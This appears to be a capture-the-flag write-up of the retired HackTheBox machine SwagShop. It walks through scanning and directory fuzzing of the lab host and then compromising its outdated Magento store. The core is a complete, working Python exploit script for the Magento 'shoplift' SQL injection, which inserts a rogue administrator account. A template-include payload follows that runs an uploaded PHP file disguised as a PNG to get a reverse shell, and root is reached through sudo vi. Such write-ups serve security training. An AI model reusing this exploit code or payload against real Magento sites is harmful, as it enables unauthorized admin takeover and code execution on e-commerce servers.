---
title: "HackTheBox — SwagShop Writeup"
date: 2020-08-25 22:42:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [Magento, vi, sudo, php, wfuzz, Froghopper attack, Swagshop]
image: /assets/img/Posts/SwagShop.png
---

> SwagShop from HackTheBox is an retired machine which had a web service running with an outdated vulnerable Magento CMS that allows us to perform an RCE using Froghopper Attack and get a reverse shell. Later we can exploit sudo privileges to run vi as root through sudo command and exploit it to get root shell.

# Recon
lol
## nmap

```
# Nmap 7.92 scan initiated Fri May  6 14:23:07 2022 as: nmap -sCV -p22,80 -oN Targeted 10.10.10.140
Nmap scan report for swagshop.htb (10.10.10.140)
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  6 14:23:17 2022 -- 1 IP address (1 host up) scanned in 10.29 seconds
```


## whatweb

```
❯ whatweb 10.10.10.140
http://10.10.10.140 [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
ERROR Opening: http://swagshop.htb/ - no address for swagshop.htb
```

### virtual hosting is being used, trying again:

```
❯ whatweb 10.10.10.140
http://10.10.10.140 [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
http://swagshop.htb/ [200 OK] Apache[2.4.18], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[frontend], IP[10.10.10.140], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
```

## looking at the website

![test](/assets/img/Posts/836564d99f855c02698794b613401c04.png)

## lets fuzz using wfuzz to see what other directories we can find


```
wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt swagshop.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://swagshop.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                         
=====================================================================

000000624:   301        9 L      28 W       315 Ch      "includes"                                                                                                                      
000000707:   301        9 L      28 W       310 Ch      "lib"                                                                                                                           
000000895:   301        9 L      28 W       310 Ch      "app"                                                                                                                           
000000939:   301        9 L      28 W       309 Ch      "js"                                                                                                                            
000000066:   301        9 L      28 W       312 Ch      "media"                                                                                                                         
000001674:   301        9 L      28 W       312 Ch      "shell"                                                                                                                         
000001832:   301        9 L      28 W       311 Ch      "skin"                                                                                                                          
000004689:   301        9 L      28 W       310 Ch      "var"                                                                                                                           
000005694:   301        9 L      28 W       313 Ch      "errors"                                                                                                                        
000045226:   200        327 L    904 W      16097 Ch    "http://swagshop.htb/"                                                                                                          
000049181:   200        54 L     155 W      1319 Ch     "mage"
```

## Nothing interesting... let's fuzz index.php

```
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt swagshop.htb/index.php/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://swagshop.htb/index.php/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                         
=====================================================================

000000213:   200        327 L    852 W      15290 Ch    "contacts"                                                                                                                      
000000228:   302        0 L      0 W        0 Ch        "catalog"                                                                                                                       
000000245:   200        51 L     211 W      3609 Ch     "admin"                                                                                                                         
000000024:   200        327 L    904 W      16095 Ch    "home"                                                                                                                          
000000272:   200        327 L    904 W      16095 Ch    "Home"                                                                                                                          
^C /usr/lib/python3.10/site-packages/wfuzz/wfuzz.py:79: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 481
Filtered Requests: 476
Requests/sec.: 0

```

## admin panel

![test2](/assets/img/Posts/af66c860668fc11c486e0596c6e7d05e.png)

# Searchsploit

![test3](/assets/img/Posts/207e1b6bf4c013d3abe76f90d470472f.png)
## Exploit used
```
xml/webapps/37977.py
```


```
# Fixing exploit

python3 RCE_magento.py
> /home/b3t4m3/Desktop/b3t4m3/HTB/Easy/SwagShop/exploits/RCE_magento.py(31)<module>()
-> r = requests.post(target_url,
(Pdb) l
 26  	pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
 27  	
 28  	# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
 29  	pdb.set_trace()
 30  	
 31  ->	r = requests.post(target_url,
 32  	                 data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
 33  	                       "filter": base64.b64encode(pfilter),
 34  	                       "forwarded": 1})
 35  	if r.ok:
 36  	   print("WORKED")
(Pdb) p type(pfilter)
<class 'str'>
(Pdb) p pfilter
"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);SET @SALT = 'rp';SET @PASS = CONCAT(MD5(CONCAT( @SALT , 'b3t4m3') ), CONCAT(':', @SALT ));SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','b3t4m3',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = 'b3t4m3'),'Firstname');"
(Pdb) p pfilter.encode()
b"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);SET @SALT = 'rp';SET @PASS = CONCAT(MD5(CONCAT( @SALT , 'b3t4m3') ), CONCAT(':', @SALT ));SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','b3t4m3',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = 'b3t4m3'),'Firstname');"
(Pdb)
```

## Exploit

![test4](/assets/img/Posts/4f01a1d5c0c842f66145232cf8a43418.png)

### python3 Script, needed to add .encode() at pfilter

```
import requests
import base64
import sys
import pdb

target = "http://swagshop.htb/index.php"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="b3t4m3", password="b3t4m3")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}

r = requests.post(target_url,
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter.encode()),
                        "forwarded": 1})
if r.ok:
    print("WORKED")
    print("Check {0}/admin with creds b3t4m3:b3t4m3".format(target))
else:
    print("DID NOT WORK")
```

# Owning admin panel

![test4](/assets/img/Posts/2e6f1656aef3b557b993684ca3d4c7ee.png)

# change template settings

![test5](/assets/img/Posts/ceab10cc8de7c71538770ff584862da9.png)

# Uploading a malicious php file

## evil idiot.php.png file

![test6](/assets/img/Posts/9e3d6481bf930bbae6394cac6c899af1.png)

### payload:
```
{{block type="core/template" template="../../../../../../media/catalog/category/idiot.php.png}}
```


![test7](/assets/img/Posts/bdddbdd3c3342df993643f2182e377fb.png)
## Then just preview the template

## rev shell


![test8](/assets/img/Posts/973e0297d921f4387bec5688ffa1e320.png)


### user.txt

![b13d7fcc52883ff6ac4b9afaa4ef8247.png](/assets/img/Posts/b13d7fcc52883ff6ac4b9afaa4ef8247.png)


# Priv escalation


## sudo -l

![dfeb34cc7dd82f2cc694556f993140fc.png](/assets/img/Posts/dfeb34cc7dd82f2cc694556f993140fc.png)


![860ccf76f09880d7c712c27a74220bc2.png](/assets/img/Posts/860ccf76f09880d7c712c27a74220bc2.png)

## root shell


![0e40fd904030a0c8eb664dd82d4d8ab2.png](/assets/img/Posts/0e40fd904030a0c8eb664dd82d4d8ab2.png)

### root.txt

![8b85a3b6158b588d9e2f110c30240b84.png](/assets/img/Posts/8b85a3b6158b588d9e2f110c30240b84.png)
